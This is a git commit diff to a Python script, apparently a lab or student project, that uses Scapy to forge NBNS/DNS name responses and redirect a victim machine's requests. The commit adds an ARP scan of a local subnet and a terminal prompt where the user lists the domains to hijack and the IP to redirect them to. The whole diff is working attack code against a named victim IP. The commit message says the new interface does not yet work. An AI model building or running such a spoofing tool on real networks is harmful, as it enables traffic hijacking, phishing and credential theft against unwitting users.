147258571f8e63e357448f2e4b677f740fa890c5
vorobyova1998 <alinavorobyova8@gmail.com>
2020-03-24 16:50:09 +0100

    simple interaction via terminal - does not work

--- dnsSpoofing.py
+++ dnsSpoofing.py
@@ -18,7 +18,8 @@ class Dns():
     def sendFakeResponse(self, pkt):
         if pkt.haslayer(NBNSQueryRequest) and pkt[IP].src == self.victimIP:
             print(pkt[NBNSQueryRequest].QUESTION_NAME + " is being requested.")
-            if pkt[NBNSQueryRequest].QUESTION_NAME in self.spoofedWebsites.keys():
+            print(self.spoofedWebsites.keys())
+            if str(pkt[NBNSQueryRequest].QUESTION_NAME) in self.spoofedWebsites.keys():
                 print(pkt[NBNSQueryRequest].QUESTION_NAME + " is being redirected to " + self.spoofedWebsites.get(pkt[NBNSQueryRequest].QUESTION_NAME))
                 etherLayer = Ether(src=get_if_hwaddr(self.networkInterface), dst=pkt[Ether].src)
                 ipLayer = IP(src=pkt[IP].src, dst=pkt[IP].src)
@@ -37,7 +38,30 @@ class Dns():
 
 networkInterface = "enp0s3"
 victimIP = "192.168.56.101"
-spoofedWebsites = {"WWW.GOOGLE.COM" : "192.168.56.102"}
+# spoofedWebsites = {"WWW.GOOGLE.COM" : "192.168.56.102"} #when user will input it always add www. infront and make evrything in upper case
+spoofedWebsites = {}
 
+#simple terminal interface
+print("Scanning the network .. ")
+ans, unans = srp (Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = "192.168.56.0/24"), timeout = 2, iface = networkInterface, inter = 0.1)
+for arg1, arg2 in ans :
+    print ("IP: {} MAC: {}".format(arg2[ARP].psrc, arg2[ARP].hwsrc))
+
+
+print ("Start DNS spoof")
+redirectTo = raw_input("Enter the ip where or tool will redirect victim requests:")
+
+input = ""
+while input != "stop":
+    input = raw_input("Enter the URL to DNS spoof list or stop if you are done: ")
+    if input != "stop":
+        input = input.upper()
+        spoofedWebsites.update({input : redirectTo})
+        if input[0:4] != "WWW.":
+            spoofedWebsites.update({"WWW."+ input: redirectTo})
+        else:
+            spoofedWebsites.update({input[4:]: redirectTo})
+
+print(spoofedWebsites)
 test = Dns(networkInterface, victimIP, spoofedWebsites)
 test.start()
